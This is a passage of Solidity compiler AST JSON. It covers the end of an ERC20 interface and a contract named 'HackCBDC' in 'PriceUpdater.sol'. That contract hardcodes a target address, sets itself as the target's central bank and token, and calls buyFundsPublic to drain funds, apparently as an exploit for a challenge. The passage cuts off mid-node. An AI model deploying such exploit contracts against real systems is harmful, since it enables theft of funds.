												"nodeType": "VariableDeclaration",
												"scope": 34,
												"src": "971:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 31,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "971:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "970:9:0"
									},
									"scope": 77,
									"src": "912:68:0",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"documentation": {
										"id": 35,
										"nodeType": "StructuredDocumentation",
										"src": "986:202:0",
										"text": " @dev Moves `amount` tokens from the caller's account to `to`.\n Returns a boolean value indicating whether the operation succeeded.\n Emits a {Transfer} event."
									},
									"functionSelector": "a9059cbb",
									"id": 44,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "transfer",
									"nameLocation": "1202:8:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 40,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 37,
												"mutability": "mutable",
												"name": "to",
												"nameLocation": "1219:2:0",
												"nodeType": "VariableDeclaration",
												"scope": 44,
												"src": "1211:10:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 36,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1211:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 39,
												"mutability": "mutable",
												"name": "amount",
												"nameLocation": "1231:6:0",
												"nodeType": "VariableDeclaration",
												"scope": 44,
												"src": "1223:14:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 38,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1223:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "1210:28:0"
									},
									"returnParameters": {
										"id": 43,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 42,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 44,
												"src": "1257:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 41,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "1257:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "1256:6:0"
									},
									"scope": 77,
									"src": "1193:70:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"documentation": {
										"id": 45,
										"nodeType": "StructuredDocumentation",
										"src": "1269:264:0",
										"text": " @dev Returns the remaining number of tokens that `spender` will be\n allowed to spend on behalf of `owner` through {transferFrom}. This is\n zero by default.\n This value changes when {approve} or {transferFrom} are called."
									},
									"functionSelector": "dd62ed3e",
									"id": 54,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "allowance",
									"nameLocation": "1547:9:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 50,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 47,
												"mutability": "mutable",
												"name": "owner",
												"nameLocation": "1565:5:0",
												"nodeType": "VariableDeclaration",
												"scope": 54,
												"src": "1557:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 46,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1557:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 49,
												"mutability": "mutable",
												"name": "spender",
												"nameLocation": "1580:7:0",
												"nodeType": "VariableDeclaration",
												"scope": 54,
												"src": "1572:15:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 48,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1572:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "1556:32:0"
									},
									"returnParameters": {
										"id": 53,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 52,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 54,
												"src": "1612:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 51,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1612:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "1611:9:0"
									},
									"scope": 77,
									"src": "1538:83:0",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"documentation": {
										"id": 55,
										"nodeType": "StructuredDocumentation",
										"src": "1627:642:0",
										"text": " @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n Returns a boolean value indicating whether the operation succeeded.\n IMPORTANT: Beware that changing an allowance with this method brings the risk\n that someone may use both the old and the new allowance by unfortunate\n transaction ordering. One possible solution to mitigate this race\n condition is to first reduce the spender's allowance to 0 and set the\n desired value afterwards:\n https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n Emits an {Approval} event."
									},
									"functionSelector": "095ea7b3",
									"id": 64,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "approve",
									"nameLocation": "2283:7:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 60,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 57,
												"mutability": "mutable",
												"name": "spender",
												"nameLocation": "2299:7:0",
												"nodeType": "VariableDeclaration",
												"scope": 64,
												"src": "2291:15:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 56,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2291:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 59,
												"mutability": "mutable",
												"name": "amount",
												"nameLocation": "2316:6:0",
												"nodeType": "VariableDeclaration",
												"scope": 64,
												"src": "2308:14:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 58,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2308:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "2290:33:0"
									},
									"returnParameters": {
										"id": 63,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 62,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 64,
												"src": "2342:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 61,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "2342:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "2341:6:0"
									},
									"scope": 77,
									"src": "2274:74:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"documentation": {
										"id": 65,
										"nodeType": "StructuredDocumentation",
										"src": "2354:287:0",
										"text": " @dev Moves `amount` tokens from `from` to `to` using the\n allowance mechanism. `amount` is then deducted from the caller's\n allowance.\n Returns a boolean value indicating whether the operation succeeded.\n Emits a {Transfer} event."
									},
									"functionSelector": "23b872dd",
									"id": 76,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "transferFrom",
									"nameLocation": "2655:12:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 72,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 67,
												"mutability": "mutable",
												"name": "from",
												"nameLocation": "2685:4:0",
												"nodeType": "VariableDeclaration",
												"scope": 76,
												"src": "2677:12:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 66,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2677:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 69,
												"mutability": "mutable",
												"name": "to",
												"nameLocation": "2707:2:0",
												"nodeType": "VariableDeclaration",
												"scope": 76,
												"src": "2699:10:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 68,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2699:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 71,
												"mutability": "mutable",
												"name": "amount",
												"nameLocation": "2727:6:0",
												"nodeType": "VariableDeclaration",
												"scope": 76,
												"src": "2719:14:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 70,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2719:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "2667:72:0"
									},
									"returnParameters": {
										"id": 75,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 74,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 76,
												"src": "2758:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 73,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "2758:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "2757:6:0"
									},
									"scope": 77,
									"src": "2646:118:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 78,
							"src": "202:2564:0",
							"usedErrors": []
						}
					],
					"src": "106:2661:0"
				},
				"id": 0
			},
			"contracts/PriceUpdater.sol": {
				"ast": {
					"absolutePath": "contracts/PriceUpdater.sol",
					"exportedSymbols": {
						"HackCBDC": [
							150
						],
						"IERC20": [
							77
						],
						"MultiSig": [
							104
						]
					},
					"id": 151,
					"license": "GPL-3.0",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 79,
							"literals": [
								"solidity",
								"^",
								"0.8",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "36:23:1"
						},
						{
							"absolutePath": "@openzeppelin/contracts/token/ERC20/IERC20.sol",
							"file": "@openzeppelin/contracts/token/ERC20/IERC20.sol",
							"id": 80,
							"nameLocation": "-1:-1:-1",
							"nodeType": "ImportDirective",
							"scope": 151,
							"sourceUnit": 78,
							"src": "61:56:1",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"abstract": false,
							"baseContracts": [
								{
									"baseName": {
										"id": 81,
										"name": "IERC20",
										"nameLocations": [
											"142:6:1"
										],
										"nodeType": "IdentifierPath",
										"referencedDeclaration": 77,
										"src": "142:6:1"
									},
									"id": 82,
									"nodeType": "InheritanceSpecifier",
									"src": "142:6:1"
								}
							],
							"canonicalName": "MultiSig",
							"contractDependencies": [],
							"contractKind": "interface",
							"fullyImplemented": false,
							"id": 104,
							"linearizedBaseContracts": [
								104,
								77
							],
							"name": "MultiSig",
							"nameLocation": "130:8:1",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"functionSelector": "8cba4686",
									"id": 87,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "upgradeUSDC",
									"nameLocation": "161:11:1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 85,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 84,
												"mutability": "mutable",
												"name": "_usdc",
												"nameLocation": "181:5:1",
												"nodeType": "VariableDeclaration",
												"scope": 87,
												"src": "173:13:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 83,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "173:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "172:15:1"
									},
									"returnParameters": {
										"id": 86,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "197:0:1"
									},
									"scope": 104,
									"src": "152:46:1",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"functionSelector": "132ad223",
									"id": 90,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "signWithdrawal",
									"nameLocation": "210:14:1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 88,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "224:2:1"
									},
									"returnParameters": {
										"id": 89,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "235:0:1"
									},
									"scope": 104,
									"src": "201:35:1",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"functionSelector": "077bf51a",
									"id": 95,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "updateCentralBank",
									"nameLocation": "248:17:1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 93,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 92,
												"mutability": "mutable",
												"name": "_newBank",
												"nameLocation": "274:8:1",
												"nodeType": "VariableDeclaration",
												"scope": 95,
												"src": "266:16:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 91,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "266:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "265:18:1"
									},
									"returnParameters": {
										"id": 94,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "292:0:1"
									},
									"scope": 104,
									"src": "239:54:1",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"functionSelector": "f441d21a",
									"id": 100,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "addSignature",
									"nameLocation": "305:12:1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 98,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 97,
												"mutability": "mutable",
												"name": "_newSig",
												"nameLocation": "326:7:1",
												"nodeType": "VariableDeclaration",
												"scope": 100,
												"src": "318:15:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 96,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "318:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "317:17:1"
									},
									"returnParameters": {
										"id": 99,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "343:0:1"
									},
									"scope": 104,
									"src": "296:48:1",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"functionSelector": "f99a1f30",
									"id": 103,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "buyFundsPublic",
									"nameLocation": "356:14:1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 101,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "370:2:1"
									},
									"returnParameters": {
										"id": 102,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "381:0:1"
									},
									"scope": 104,
									"src": "347:35:1",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 151,
							"src": "120:264:1",
							"usedErrors": []
						},
						{
							"abstract": false,
							"baseContracts": [],
							"canonicalName": "HackCBDC",
							"contractDependencies": [],
							"contractKind": "contract",
							"fullyImplemented": true,
							"id": 150,
							"linearizedBaseContracts": [
								150
							],
							"name": "HackCBDC",
							"nameLocation": "395:8:1",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"id": 107,
									"mutability": "mutable",
									"name": "cbdc",
									"nameLocation": "425:4:1",
									"nodeType": "VariableDeclaration",
									"scope": 150,
									"src": "409:65:1",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_address",
										"typeString": "address"
									},
									"typeName": {
										"id": 105,
										"name": "address",
										"nodeType": "ElementaryTypeName",
										"src": "409:7:1",
										"stateMutability": "nonpayable",
										"typeDescriptions": {
											"typeIdentifier": "t_address",
											"typeString": "address"
										}
									},
									"value": {
										"hexValue": "307835353037313465314664373437303834466335634232423265336139333531323937326165426441",
										"id": 106,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"kind": "number",
										"lValueRequested": false,
										"nodeType": "Literal",
										"src": "432:42:1",
										"typeDescriptions": {
											"typeIdentifier": "t_address",
											"typeString": "address"
										},
										"value": "0x550714e1Fd747084Fc5cB2B2e3a93512972aeBdA"
									},
									"visibility": "private"
								},
								{
									"body": {
										"id": 118,
										"nodeType": "Block",
										"src": "515:55:1",
										"statements": [
											{
												"expression": {
													"arguments": [
														{
															"expression": {
																"id": 114,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 4294967281,
																"src": "554:3:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 115,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberLocation": "558:6:1",
															"memberName": "sender",
															"nodeType": "MemberAccess",
															"src": "554:10:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														],
														"expression": {
															"arguments": [
																{
																	"id": 111,
																	"name": "cbdc",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 107,
																	"src": "530:4:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 110,
																"name": "MultiSig",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 104,
																"src": "521:8:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_contract$_MultiSig_$104_$",
																	"typeString": "type(contract MultiSig)"
																}
															},
															"id": 112,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "521:14:1",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_MultiSig_$104",
																"typeString": "contract MultiSig"
															}
														},
														"id": 113,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberLocation": "536:17:1",
														"memberName": "updateCentralBank",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 95,
														"src": "521:32:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_nonpayable$_t_address_$returns$__$",
															"typeString": "function (address) external"
														}
													},
													"id": 116,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "521:44:1",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 117,
												"nodeType": "ExpressionStatement",
												"src": "521:44:1"
											}
										]
									},
									"functionSelector": "9b6822f8",
									"id": 119,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "updateCentralBank",
									"nameLocation": "488:17:1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 108,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "505:2:1"
									},
									"returnParameters": {
										"id": 109,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "515:0:1"
									},
									"scope": 150,
									"src": "479:91:1",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 138,
										"nodeType": "Block",
										"src": "789:89:1",
										"statements": [
											{
												"expression": {
													"arguments": [
														{
															"arguments": [
																{
																	"id": 128,
																	"name": "this",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 4294967268,
																	"src": "830:4:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_contract$_HackCBDC_$150",
																		"typeString": "contract HackCBDC"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_contract$_HackCBDC_$150",
																		"typeString": "contract HackCBDC"
																	}
																],
																"id": 127,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "822:7:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": {
																	"id": 126,
																	"name": "address",
																	"nodeType": "ElementaryTypeName",
																	"src": "822:7:1",
																	"typeDescriptions": {}
																}
															},
															"id": 129,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "822:13:1",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														],
														"expression": {
															"arguments": [
																{
																	"id": 123,
																	"name": "cbdc",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 107,
																	"src": "804:4:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 122,
																"name": "MultiSig",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 104,
																"src": "795:8:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_contract$_MultiSig_$104_$",
																	"typeString": "type(contract MultiSig)"
																}
															},
															"id": 124,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "795:14:1",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_MultiSig_$104",
																"typeString": "contract MultiSig"
															}
														},
														"id": 125,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberLocation": "810:11:1",
														"memberName": "upgradeUSDC",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 87,
														"src": "795:26:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_nonpayable$_t_address_$returns$__$",
															"typeString": "function (address) external"
														}
													},
													"id": 130,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "795:41:1",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 131,
												"nodeType": "ExpressionStatement",
												"src": "795:41:1"
											},
											{
												"expression": {
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"expression": {
															"arguments": [
																{
																	"id": 133,
																	"name": "cbdc",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 107,
																	"src": "851:4:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 132,
																"name": "MultiSig",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 104,
																"src": "842:8:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_contract$_MultiSig_$104_$",
																	"typeString": "type(contract MultiSig)"
																}
															},
															"id": 134,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "842:14:1",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_MultiSig_$104",
																"typeString": "contract MultiSig"
															}
														},
														"id": 135,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberLocation": "857:14:1",
														"memberName": "buyFundsPublic",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 103,
														"src": "842:29:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_nonpayable$__$returns$__$",
															"typeString": "function () external"
														}
													},
													"id": 136,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "842:31:1",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 137,
												"nodeType": "ExpressionStatement",
												"src": "842:31:1"
											}
										]
									},
									"functionSelector": "e9e8f34d",
									"id": 139,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "upgradeUSDC",
									"nameLocation": "768:11:1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 120,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "779:2:1"
									},
									"returnParameters": {
										"id": 121,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "789:0:1"
									},
									"scope": 150,
									"src": "759:119:1",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 148,
										"nodeType": "Block",
										"src": "917:44:1",
										"statements": [
											{
												"expression": {
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"expression": {
															"arguments": [
																{
																	"id": 143,
																	"name": "cbdc",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 107,
																	"src": "934:4:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 142,
																"name": "MultiSig",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 104,
																"src": "925:8:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_contract$_MultiSig_$104_$",
																	"typeString": "type(contract MultiSig)"
																}
															},
															"id": 144,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "925:14:1",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_MultiSig_$104",
																"typeString": "contract MultiSig"
															}
														},
														"id": 145,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberLocation": "940:14:1",
														"memberName": "buyFundsPublic",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 103,
														"src": "925:29:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_nonpayable$__$returns$__$",
															"typeString": "function () external"
														}
													},
													"id": 146,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "925:31:1",
													"tryCall": false,
